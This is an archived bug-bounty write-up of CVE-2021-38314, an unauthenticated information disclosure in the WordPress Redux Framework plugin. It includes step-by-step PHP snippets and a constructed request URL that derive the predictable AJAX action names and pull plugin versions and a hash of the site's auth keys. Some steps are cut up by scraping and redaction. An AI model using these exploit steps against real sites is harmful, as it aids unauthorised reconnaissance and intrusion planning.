---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-11-25_unauthenticated-sensitive-information-disclosure-at-redacted.md
original_filename: 2021-11-25_unauthenticated-sensitive-information-disclosure-at-redacted.md
title: Unauthenticated Sensitive Information Disclosure at [REDACTED]
category: documents
detected_topics:
- command-injection
- otp
- information-disclosure
- supply-chain
tags:
- imported
- documents
- command-injection
- otp
- information-disclosure
- supply-chain
language: en
raw_sha256: 1c3e2c5399a779e1277a333e339515140b50f9c603aada0422d261412cf5bd23
text_sha256: 8d08d4cdf35605c377e7d6351fe2814d55f94f77e9e042097639b89415d66720
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: true
---

# Unauthenticated Sensitive Information Disclosure at [REDACTED]

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-11-25_unauthenticated-sensitive-information-disclosure-at-redacted.md
- Source Type: markdown
- Detected Topics: command-injection, otp, information-disclosure, supply-chain
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: True
- Raw SHA256: `1c3e2c5399a779e1277a333e339515140b50f9c603aada0422d261412cf5bd23`
- Text SHA256: `8d08d4cdf35605c377e7d6351fe2814d55f94f77e9e042097639b89415d66720`


## Content

---
title: "Unauthenticated Sensitive Information Disclosure at [REDACTED]"
url: "https://wahaz.medium.com/unauthenticated-sensitive-information-disclosure-at-redacted-2702224098c"
authors: ["Rizaldi Wahaz (@wah_haz)"]
bugs: ["Old components with known vulnerabilities", "Information disclosure"]
publication_date: "2021-11-25"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3142
scraped_via: "browseros"
---

# Unauthenticated Sensitive Information Disclosure at [REDACTED]

Unauthenticated Sensitive Information Disclosure at [REDACTED]
Rizaldi Wahaz
Follow
2 min read
·
Nov 25, 2021

113

5

Hello InfoSec Community, I want to share my submission about this vulnerability, sorry for bad writing, still learning ✌

During my research, I was found the subdomain https://blog.redacted.com/ is vulnerable with Unauthenticated Sensitive Information Disclosure (CVE-2021–38314).

The Gutenberg Template Library & Redux Framework plugin <= 4.2.11 for WordPress registered several AJAX actions available to unauthenticated users in the `includes` function in `redux-core/class-redux-core.php` that were unique to a given site but deterministic and predictable given that they were based on an md5 hash of the site URL with a known salt value of ‘-redux’ and an md5 hash of the previous hash with a known salt value of ‘-support’.

These AJAX actions could be used to retrieve a list of active plugins and their versions, the site’s PHP version, and an unsalted md5 hash of site’s `AUTH_KEY` concatenated with the `SECURE_AUTH_KEY`.

Proof of Concept:

1. Found subdomain blog.redacted.com is using wordpress, then try the CVE-2021–38314

2. Using this script

$target = “https://blog.redacted.com";
$key1 = md5(“$target/-redux”);
$key2 = file_get_contents(“$target/wp-admin/admin-ajax.php?action=$key1”);

3. It returns e24eb61b09bf2340779b35xxxxxxxxxx a hash of the auth_key_secret_key with “-redux” appended.

4. Append “-support” and md5 it again and thats the new function hook name.

$key3 = md5($key2.’-support’);

5. Then get the hash ***REDACTED-SUSPECT-TOKEN***6. So what this code does is compare the code param with the output of https://verify.redux.io/?hash=1505d4269113e1bda36c47xxxxxxxxxx&site=http://blog.redacted.com/

$redux_code = b1mzZ3%2BU0p43TZ6%2F7QJaYU0hJMHgdcT5Bc%2Bnyo4t3xUenDRm0Ef8***REDACTED-SUSPECT-TOKEN***7. Final URL https://blog.redacted.com/wp-admin/admin-ajax.php?action=1505d4269113e1bda36c47xxxxxxxxxx&code=b1mzZ3%2BU0p43TZ6%2F7QJaYU0hJMHgdcT5Bc%2Bnyo4t3xUenDRm0Ef8***REDACTED-SUSPECT-TOKEN***Get Rizaldi Wahaz’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Voila

Press enter or click to view image in full size

Here is the PHP full script

Press enter or click to view image in full size

Impact:

Attacker can retrieve sensitive information such as a list of active plugins and their versions, the site’s PHP version, and an unsalted md5 hash of site’s `AUTH_KEY` concatenated with the `SECURE_AUTH_KEY`. This would be most useful in cases where a separate plugin with an additional vulnerability was installed, as an attacker could use the information to save time and plan an intrusion.

Timeline:

8 Nov 2021: Report

11 Nov 2021: Fixed

Rewards: -

Reference:

https://www.wordfence.com/blog/2021/09/over-1-million-sites-affected-by-redux-framework-vulnerabilities/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38314
https://blog.sorcery.ie/posts/redux_wordpress/
